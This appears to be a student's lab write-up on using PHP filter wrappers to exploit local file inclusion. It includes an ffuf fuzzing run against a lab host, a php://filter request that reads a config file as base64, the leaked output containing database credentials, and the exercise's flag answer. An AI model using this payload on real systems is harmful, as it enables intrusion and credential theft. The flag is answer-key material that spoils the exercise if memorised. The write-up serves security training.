# PHP Filters
If we identify an LFI vulnerability in PHP web applications, then we can utilize different [PHP Wrappers](https://www.php.net/manual/en/wrappers.php.php) to be able to extend our LFI exploitation, and even potentially reach remote code execution.

PHP Wrappers allow us to access different I/O streams at the application level, like standard input/output, file descriptors, and memory streams. 

## Input Filters
[PHP Filters](https://www.php.net/manual/en/filters.php) allow us to transform stream data by applying specific filters during stream operations. To use PHP stream wrappers, we can use schemes such as php://, and we can access the PHP filter wrapper with php://filter/ to apply filters to a resource.

The `filter` wrapper has several parameters, but the main ones we require for our attack are `resource` and `read`. The `resource` parameter is required for filter wrappers, and with it we can specify the stream we would like to apply the filter on (e.g. a local file), while the `read` parameter can apply different filters on the input resource, so we can use it to specify which filter we want to apply on our resource.

```
php://filter/read=convert.base64-encode/resource=config
```

## Questions
1. Fuzz the web application for other php scripts, and then read one of the configuration files and submit the database password as the answer **Answer: HTB{n3v3r_\$t0r3_pl4!nt3xt_cr3d\$}**
   - Fuzzing for PHP config file → found `config.php`:
        ```shellsession
        $ ffuf -w /opt/useful/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt -u http://154.57.164.75:31772/FUZZ.php -ic

                /'___\  /'___\           /'___\       
            /\ \__/ /\ \__/  __  __  /\ \__/       
            \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
                \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
                \ \_\   \ \_\  \ \____/  \ \_\       
                \/_/    \/_/   \/___/    \/_/       

            v2.1.0-dev
        ________________________________________________

        :: Method           : GET
        :: URL              : http://154.57.164.75:31772/FUZZ.php
        :: Wordlist         : FUZZ: /opt/useful/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt
        :: Follow redirects : false
        :: Calibration      : false
        :: Timeout          : 10
        :: Threads          : 40
        :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
        ________________________________________________

                                [Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 155ms]
        en                      [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 155ms]
        es                      [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 154ms]
        index                   [Status: 200, Size: 2652, Words: 690, Lines: 64, Duration: 4165ms]
        configure               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 164ms]
        ```
   - Use PHP filter to read the config file as Base64. Base64 decode this would give us the DB password:
        ```
        GET /index.php?language=php://filter/read=convert.base64-encode/resource=configure HTTP/1.1
        ```
        ```
        PD9waHAKCmlmICgkX1NFUlZFUlsnUkVRVUVTVF9NRVRIT0QnXSA9PSAnR0VUJyAmJiByZWFscGF0aChfX0ZJTEVfXykgPT0gcmVhbHBhdGgoJF9TRVJWRVJbJ1NDUklQVF9GSUxFTkFNRSddKSkgewogIGhlYWRlcignSFRUUC8xLjAgNDAzIEZvcmJpZGRlbicsIFRSVUUsIDQwMyk7CiAgZGllKGhlYWRlcignbG9jYXRpb246IC9pbmRleC5waHAnKSk7Cn0KCiRjb25maWcgPSBhcnJheSgKICAnREJfSE9TVCcgPT4gJ2RiLmlubGFuZWZyZWlnaHQubG9jYWwnLAogICdEQl9VU0VSTkFNRScgPT4gJ3Jvb3QnLAogICdEQl9QQVNTV09SRCcgPT4gJ0hUQntuM3Yzcl8kdDByM19wbDQhbnQzeHRfY3IzZCR9JywKICAnREJfREFUQUJBU0UnID0+ICdibG9nZGInCik7CgokQVBJX0tFWSA9ICJBd2V3MjQyR0RzaHJmNDYrMzUvayI7 
        ```